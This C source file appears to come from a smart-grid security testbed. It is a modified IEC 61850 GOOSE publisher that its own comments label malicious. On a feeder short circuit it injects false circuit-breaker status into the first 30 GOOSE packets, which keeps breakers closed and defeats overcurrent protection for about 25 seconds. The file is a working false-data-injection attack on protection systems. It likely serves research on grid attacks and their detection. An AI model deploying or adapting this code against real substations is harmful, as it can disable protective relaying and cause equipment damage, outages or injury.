/*
 * goose_publisher_PIOC_8432
 
#####################################################################################################################################################

Malicious behaviour:

Network level: If a short circuit happens on any feeders, the allData fields of the first 30 GOOSE packets published by IED_FDR are modified to (0100000: close all CBs except for CB2_22KV) to physcial process (Simulink).

Physical process level:If a short circuit happens on any feeders, (CB_FDR1 or CB_FDR2 or CB_FDR3 or CB_FDR4) will be still closed for 25 seconds, overcurrent protection fails for the first 25 seconds.

#####################################################################################################################################################
*/

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <math.h>
#include <unistd.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

//#######Define the attack settings #########//

//The number of packets in one period
#define No_pkts 30 

// has to be executed as root!
int
main(int argc, char** argv)
{
    char* interface;
    int HBnew = 1000; // the new HB when st changes
    int CBstval[7] = {0,1,0,0,0,0,0}; // current CBstval
    int PreCBstval[7] = {0,1,0,0,0,0,0}; // previous CBstval
//########################################################Malicious codes begin###########################################################################################//	 	         
    int FaultFree[7] = {0,1,0,0,0,0,0}; // CBstval when fault-free
    int idx_pkt = 1; // the index of the inject packets
//########################################################Malicious codes end#############################################################################################//
    int idx_cycle50ms = 1;
    
    if (argc > 1)
       interface = argv[1];
    else
       interface = "enp0s8";

    printf("Using interface %s\n", interface);
	
	CommParameters gooseCommParameters;

	gooseCommParameters.appId = 0x3103;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x0c;
	gooseCommParameters.dstAddress[5] = 0x03;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;

	/*
	* Create a new GOOSE publisher instance. As the second parameter the interface
	* name can be provided (e.g. "eth0" on a Linux system). If the second parameter
	* is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
	* stack_config.h is used.
	*/ 
	
	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);
	MmsValue* quality = MmsValue_newBitString(13); // Create bit-string with 13 0s

	if (publisher) {
	    GoosePublisher_setGoCbRef(publisher, "QUTZS_FDRPIOC/LLN0$GO$gcb_1");
	    GoosePublisher_setTimeAllowedToLive(publisher, 1100);    
	    GoosePublisher_setDataSetRef(publisher, "QUTZS_FDRPIOC/LLN0$DS_FDR");
	    GoosePublisher_setGoID(publisher , "gcb_1");
	    GoosePublisher_setConfRev(publisher, 200);

	    while (1) {	    	
	    	LinkedList dataSetValues = LinkedList_create(); 	
	    	FILE *fp;
	    	int i;
	    	
	    	fp=fopen("/home/ray/Desktop/FDR OverCur Prot/TripRecord/TripFromPLC.csv","r");
			for (i=0; i<7; i++)
		    	fscanf(fp,"%d,", &CBstval[i]);   
	    	fclose(fp);
	    	

			if (memcmp(PreCBstval,CBstval,sizeof(CBstval)) != 0) {
				GoosePublisher_increaseStNum(publisher); //if CB status changes (current != previous), stNum+1
//########################################################Malicious codes begin###########################################################################################//
				for (i = 0; i <7; i++ ) {
					LinkedList_add(dataSetValues, MmsValue_newBoolean(FaultFree[i]));
					LinkedList_add(dataSetValues, quality); 
				}
				idx_pkt = 2; //Set the inject packet index to 2
				//debug
				//LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(idx_pkt));
//########################################################Malicious codes end#############################################################################################//
				if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
					printf("Error sending message!\n");
				}
				memcpy(PreCBstval,CBstval,sizeof(CBstval));
				idx_cycle50ms = 1; // Reset the cycle index to 1
				HBnew = 1; // Heartbeat changes to HBnew (1ms)
				Thread_sleep(HBnew); 
				HBnew = HBnew*4;	// Heartbeat times 4 = 4ms
			}
//########################################################Malicious codes begin###########################################################################################//			
			else {
				if (idx_pkt <= No_pkts) {
					for (i = 0; i <7; i++ ) {
						LinkedList_add(dataSetValues, MmsValue_newBoolean(FaultFree[i]));
						LinkedList_add(dataSetValues, quality);
					}
				}
				else {
					for (i = 0; i <7; i++ ) {
						LinkedList_add(dataSetValues, MmsValue_newBoolean(CBstval[i]));
						LinkedList_add(dataSetValues, quality); 
					}
				}
				//debug
				//LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(idx_pkt));
//########################################################Malicious codes end#############################################################################################//				
				if (HBnew < 999) {
					if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
						printf("Error sending message!\n");
					}
					idx_pkt++; //######Malicious codes########
					Thread_sleep(HBnew);
					HBnew = HBnew*4;	// Heartbeat multiply 4 every time, until heartbeat > 1000
				}
				else {
					if (idx_cycle50ms == 1) { // send message only at the 1st 50ms-cycle
						if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
							printf("Error sending message!\n");
						}
						idx_pkt++; //######Malicious codes########
						idx_cycle50ms++;		
					}
					if ( (idx_cycle50ms > 1) && (idx_cycle50ms < 20) ) {
						idx_cycle50ms++; // 2nd to 19th 50ms-cycle
					}
					if (idx_cycle50ms == 20) {
						idx_cycle50ms = 1; // Reset index to 1
					}
					Thread_sleep(50);
				}
		    }			
			//LinkedList_destroyDeep(dataSetValues, (LinkedListValueDeleteFunction) MmsValue_delete);
			LinkedList_destroyStatic(dataSetValues);
		}
		GoosePublisher_destroy(publisher);
	}
	else {
		printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
	}
    	
}
